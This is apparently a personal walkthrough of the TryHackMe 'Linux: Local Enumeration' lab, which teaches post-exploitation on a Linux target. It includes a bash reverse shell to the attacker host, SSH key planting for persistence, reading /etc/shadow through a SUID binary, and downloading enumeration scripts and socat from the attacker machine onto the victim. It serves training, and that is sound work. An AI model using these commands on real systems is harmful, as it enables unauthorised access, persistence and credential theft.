# Linux: Local Enumeration

**Room Link:** [https://tryhackme.com/r/room/lle](https://tryhackme.com/r/room/lle)



## Introduction

Have you ever found yourself in a situation where you have no idea about "what to do after getting a reverse shell (_access to a machine_)"?\
If your answer was "Yes", this room is definitely for you. This rooms aims at providing beginner basis in box enumeration, giving a detailed approach towards it.\
Here's a list of units that are going to be covered in this room:

Unit 1 - Stabilizing the shellExploring a way to transform a reverse shell into a stable bash or ssh shell.

Unit 2 - Basic enumarationEnumerate OS and the most common files to identify possible security flaws.

Unit 3 - /etc Understand the purpose and sensitivity of files under /etc directory.

Unit 4 - Important filesLearn to find files, containing potentially valuable information.

Unit 6 - Enumeration scriptsAutomate the process by running multiple community-created enumeration scripts.\
Browse to the `10.10.122.141:3000` and follow the instructions.To continue with the room material, you need to get a reverse shell using a PHP payload and a netcat listener (nc -lvnp 1234).\
How reverse shells work in a nutshell:\


<figure><img src="https://i.imgur.com/WlwnnqK.png" alt=""><figcaption></figcaption></figure>



**rev.sh**

```
bash -i >& /dev/tcp/$KALI/4444 0>&1
```

**Kali**&#x20;

```
nc -lnvp 4444
```

<figure><img src="../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

**Browser cmd.php**

```
ls -lah
chmod +x uploadsrev.sh 
bash uploadsrev.sh
```

<figure><img src="../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

##

## Unit 1 - tty

As you might have noticed, a netcat reverse shell is pretty useless and can be easily broken by simple mistakes.In order to fix this, we need to get a 'normal' shell, aka tty (text terminal). Note: Mainly, we want to upgrade to tty because commands like su and sudo require a proper terminal to run.\
One of the simplest methods for that would be to execute /bin/bash. In most cases, it's not that easy to do and it actually requires us to do some additional work.Surprisingly enough, we can use python to execute /bin/bash and upgrade to tty:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`\


Generally speaking, you want to use an external tool to execute /bin/bash for you. While doing so, it is a good idea to try everything you know, starting from python, finishing with getting a binary on the target system.&#x20;

List of static binaries you can get on the system:

&#x20;[github.com/andrew-d/static-binaries](http://github.com/andrew-d/static-binaries)\
Try experimenting with the netcat shell you obtained in the previous task and try different versions.Read more about upgrading to TTY: [blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys](http://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys)

**Kali**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

## Unit 1 - ssh

To make things even better, you should always try and get shell access to the box.

**id\_rsa** file that contains a private key that can be used to connect to a box via ssh. It is usually located in the `.ssh` folder in the user's home folder. (Full path: `/home/user/.ssh/id_rsa`)\
Get that file on your system and give it read/write-only permissions for your user:\
(`chmod 600 id_rsa`) and connect by executing `ssh -i id_rsa user@ip`).

In case if the target box does not have a generated **id\_rsa** file (or you simply don't have reading permissions for it), you can still gain stable ssh access. All you need to do is generate your own **id\_rsa** key on your system and include an associated key into **authorized\_keys** file on the target machine.\
Execute `ssh-keygen` and you should see **id\_rsa** and `id_rsa.pub` files appear in your own **.ssh** folder. Copy the content of the **id\_rsa.pub** file and put it inside the **authorized\_keys** file on the target machine (located in .ssh folder). After that, connect to the machine using your id\_rsa file.

![](https://i.imgur.com/CZ6JRkW.jpg)

**Kali**

```
ssh-keygen -t rsa
cat /root/.ssh/id_rsa.pub
```

<figure><img src="../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChZwRGJcmWRVnscJ+Px99QCfSY4eGfc4i6P1R2SnkFBG/wJrE77GDY9bJA41ZnC5u5uCr5uLDte7I1F1SFiUJCD0ueW5r1eSyHZ5bM3FFSfSWsNcGoAA+SyUhRRmki459Glv2FmBvyCck/qYvhb5+o6Vpvr02os7sF/qBP6vdzjarQoih346NKaCcn6S95xdKS88s52aCge2kuMXl+PwgT7/uH49oTSh4eQ8/lHBLqvZois9gNAx3amKWt26XsHmx4ZcJXuNMW/usflE3XkDy7w0GGkqa0vPfbDII58KwN6eI8rI+xH2E/t/4gJbqIxi6cQQtSm6DO74pUpdi596EX root@ip-10-10-244-102" > /home/manager/.ssh/authorized_keys
```

**Kali**

```
ssh manager@$VICTIM
```

## Unit 2 - Basic enumeration

Once you get on the box, it's crucially important to do the basic enumeration. In some cases, it can save you a lot of time and provide you a shortcut into escalating your privileges to root. \
\> First, let's start with the uname command. uname prints information about the system.&#x20;

<figure><img src="https://i.imgur.com/ZkWQu4Z.png" alt=""><figcaption></figcaption></figure>

Execute `uname -a` to print out all information about the system.This simple box enumeration allows you to get initial information about the box, such as distro type and version. From this point you can easily look for known exploits and vulnerabilities.\
\> Next in our list are auto-generated bash files.Bash keeps tracks of our actions by putting plaintext used commands into a history file. (\~/.bash\_history)If you happen to have a reading permission on this file, you can easily enumerate system user's action and retrieve some sensitive infrmation. One of those would be plaintext passwords or privilege escalation methods. \
.bash\_profile and .bashrc are files containing shell commands that are run when Bash is invoked. These files can contain some interesting start up setting that can potentially reveal us some infromation. For example a bash alias can be pointed towards an important file or process.\
\> Next thing that you want to check is the sudo version.Sudo command is one of the most common targets in the privilage escalation. Its version can help you identify known exploits and vulnerabilities. Execute `sudo -V` to retrieve the version.For example, sudo versions < 1.8.28 are vulnerable to CVE-2019-14287, which is a vulnerability that allows to gain root access with 1 simple command. \
\> Last part of basic enumeration comes down to using our sudo rights.Users can be assigned to use sudo via /etc/sudoers file. It's a fully customazible file that can either limit or open access to a wider range of permissions. Run `sudo -l` to check if a user on the box is allowed to use sudo with any command on the system.&#x20;

<figure><img src="https://i.imgur.com/3y949OY.png" alt=""><figcaption></figcaption></figure>

Most of the commands open us an opportunity to escalate our priviligies via simple tricks described in [GTFObins](https://gtfobins.github.io/#+sudo).\
&#xNAN;_&#x4E;ote: Output on the picture demonstrates that user may run ALL commands on the system with sudo rights. A given configuration is the easiest way to get root._&#x20;

**Kali**

```
cat ~/.bash_history
```

## Unit 3 - /etc

Etc (etcetera) - unspecified additional items. Generally speaking, /etc folder is a central location for all your configuration files and it can be treated as a metaphorical nerve center of your Linux machine.\
Each of the files located there has its own unique purpose that can be used to retrieve some sensitive information (such as passwords). The first thing you want to check is if you are able to read and write the files in /etc folder. Let's take a look at each file specifically and figure out the way you can use them for your enumeration process.\
\> /etc/passwdThis file stores the most essential information, required during the user login process. (It stores user account information). It's a plain-text file that contains a list of the system's accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.\
Read the /etc/passwd file by running `cat /etc/passwd` and let's take a closer look.

![](https://i.imgur.com/8vhblpQ.png)

Each line of this file represents a different account, created in the system. Each field is separated with a colon (:) and carries a separate value.\
`goldfish:x:1003:1003:,,,:/home/goldfish:/bin/bash`\
1\. (goldfish) - Username

2\. (x) - Password. (x character indicates that an encrypted account password is stored in /etc/shadow file and cannot be displayed in the plain text here)

3\. (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.

4\. (1003) - Group ID (GID): Linux group ID

5\. (,,,) - User ID Info: A field that contains additional info, such as phone number, name, and last name. (,,, in this case means that I did not input any additional info while creating the user)

6\. (/home/goldfish) - Home directory: A path to user's home directory that contains all the files related to them.

7\. (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Simple users usually have /bin/bash as their shell, while services run on /usr/sbin/nologin. \
\
How can this help? Well, if you have at least reading access to this file, you can easily enumerate all existing users, services and other accounts on the system. This can open a lot of vectors for you and lead to the desired root. \
Otherwise, if you have writing access to the /etc/passwd, you can easily get root creating a custom entry with root priveleges. (For more info: [hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation))\
\> /etc/shadowThe /etc/shadow file stores actual password in an encrypted format (aka hashes) for user’s account with additional properties related to user password. Those encrypted passwords usually have a pretty similar structure, making it easy for us to identify the encoding format and crack the hash to get the password.\
So, as you might have guessed, we can use /etc/shadow to retrieve different user passwords. In most of the situations, it is more than enough to have reading permissions on this file to escalate to root privileges. `cat /etc/shadow`

<figure><img src="https://i.imgur.com/6DmDkRp.png" alt=""><figcaption></figcaption></figure>

`goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::`\
1\. (goldfish) - Username

2\. ($6$1FiLdnFwT...) - Password : Encrypted password.Basic structure: \*\*$id$salt$hashed\*\*, The $id is the algorithm used On GNU/Linux as follows:- $1$ is MD5- $2a$ is Blowfish- $2y$ is Blowfish- $5$ is SHA-256- $6$ is SHA-512

3\. (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.

4\. (0) - Minimum: The minimum number of days required between password changes (Zero means that the password can be changed immidiately).

5\. (99999) - Maximum: The maximum number of days the password is valid.

6\. (7) - Warn: The number of days before the user will be warned about changing their password.\
What can we get from here? Well, if you have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. \
Just like with /etc/passwd, writeable permission can allow us to add a new root user by making a custom entry.\
\> /etc/hosts/etc/hosts is a simple text file that allows users to assign a hostname to a specific IP address. Generally speaking, a hostname is a name that is assigned to a certain device on a network. It helps to distinguish one device from another. The hostname for a computer on a home network may be anything the user wants, for example, DesktopPC or MyLaptop. \
You can try editing your own /etc/hosts file by adding the `10.10.201.196` there like so:

<figure><img src="https://i.imgur.com/eGCyc19.png" alt=""><figcaption></figcaption></figure>

From now on you'll be able to refer to the box as box.thm.\
Why do we need it? In real-world pentesting this file may reveal a local address of devices in the same network. It can help us to enumerate the network further.

**Victim**

```
cat /etc/passwd
```

## Unit 4 - Find command and interesting files

Since it's physically impossible to browse the whole filesystem by hand, we'll be using the find command for this purpose.\
I advise you to get familiar with the command in this [room](https://tryhackme.com/room/thefindcommand).

The most important switches for us in our enumeration process are -type and -name.\
The first one allows us to limit the search towards files only `-type f` and the second one allows us to search for files by extensions using the wildcard (\*). \


<figure><img src="https://i.imgur.com/LE1vap1.png" alt=""><figcaption></figcaption></figure>

Basically, what you want to do is to look for interesting log (.log) and configuration files (.conf). In addition to that, the system owner might be keeping backup files (.bak).

Here's a list of file extensions you'd usually look for: [List](https://lauraliparulo.altervista.org/most-common-linux-file-extensions/).&#x20;

**Victim**

```
find / -type f -name *.bak 2>/dev/null 
cat /var/opt/passwords.bak 
```

<figure><img src="../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
find /etc/ \( -path /lib -o -path /snap -o -path /etc/sane.d -o -path /etc/fonts -o -path /usr/share -o -path /etc/apache2 \) -prune -o -name "*.conf" -print 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

## Unit 4 - SUID

Set User ID (SUI&#x44;**)** is a type of permission that allows users to execute a file with the permissions of another user.\
Those files which have SUID permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found SUID bit enabled binaries, then those file/program/command can be run with root privileges.&#x20;

SUID abuse is a common privilege escalation technique that allows us to gain root access by executing a root-owned binary with SUID enabled.

You can find all SUID file by executing this simple find command:

`find / -perm -u=s -type f 2>/dev/null`

-u=s searches files that are owned by the root user.\
-type f search for files, not directories

After displaying all SUID files, compare them to a list on [GTFObins](http://gtfobins.github.io/#+SUID) to see if there's a way to abuse them to get root access.&#x20;

**Victim**

```
find / -perm -u=s -type f 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
LFILE=/etc/shadow
grep '' $LFILE
```

<figure><img src="../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>



## \[Bonus] - Port Forwarding

﻿According to Wikipedia, "Port forwarding is an application of network address translation (NAT) that redirects a communication request from one address and port number combination to another while the packets are traversing a network gateway, such as a router or firewall".&#x20;

Port forwarding not only allows you to bypass firewalls but also gives you an opportunity to enumerate some local services and processes running on the box.&#x20;

The Linux netstat command gives you a bunch of information about your network connections, the ports that are in use, and the processes using them. In order to see all TCP connections, execute `netstat -at | less`. This will give you a list of running processes that use TCP. From this point, you can easily enumerate running processes and gain some valuable information.

`netstat -tulpn` will provide you a much nicer output with the most interesting data.

Read more about port forwarding here: [fumenoid.github.io/posts/port-forwarding](https://fumenoid.github.io/posts/port-forwarding)

**Victim**

```
ss -ltp
```

<figure><img src="../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>

### Option 1 - Failed

**Kali**

```
ssh manager@$VICTIM -R 3000:0.0.0.0:3000
```

**/etc/ssh/sshd\_config**

**If I had permission to this file I could modify these settings to see the website as localhost on Kali.**

```
AllowTcpForwarding yes
GatewayPorts yes
```

### Option 2 - Works&#x20;

**Kali 1**&#x20;

```
wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
python2 -m SimpleHTTPServer 82
```

**Victim**

```
cd /tmp
wget http://$KALI:82/socat-linux-amd64
chmod +x socat-linux-amd64 
./socat-linux-amd64 TCP-LISTEN:8888,fork TCP:0.0.0.0:3000
```

**Kali 2**&#x20;

```
chmod +x socat-linux-amd64 
./socat-linux-amd64 TCP-LISTEN:9999,fork TCP:10.10.19.27:8888
```

<figure><img src="../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>

## Unit 5 - Automating scripts

Even though I, personally, dislike any automatic enumeration scripts, they are really important to the privilege escalation process as they help you to omit the 'human error' in your enum process.&#x20;

\> Linpeas

LinPEAS - Linux local Privilege Escalation Awesome Script (.sh) is a script that searches for possible paths to escalate privileges on Linux/ hosts.&#x20;

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9c5d0148cf664325c8a075/room-content/5e9c5d0148cf664325c8a075-1716337058116" alt=""><figcaption></figcaption></figure>

Linpeas automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root.&#x20;

They are different ways of getting the script on the box, but the most reliable one would be to first download the script on your system and then transfer it on the target.

![](https://i.imgur.com/yAfGFDW.png)

`wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh`

After that, you get a nice output with all the vulnerable parts marked.

\> LinEnum

The second tool on our list is LinEnum. It performs 'Scripted Local Linux Enumeration & Privilege Escalation Checks' and appears to be a bit easier than linpeas.

You can get the script by running:

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

Now, as you have two tools on the box, try running both of them and see if either of them shows something interesting!\
&#xNAN;_&#x50;lease note: It's always a good idea to run multiple scripts separately and compare their output, as far as each one of them has their own specific scope of exploration._



**Kali**

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python2 -m SimpleHTTPServer 82
```

**Victim**

```
cd /tmp
wget http://$KALI:82/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```
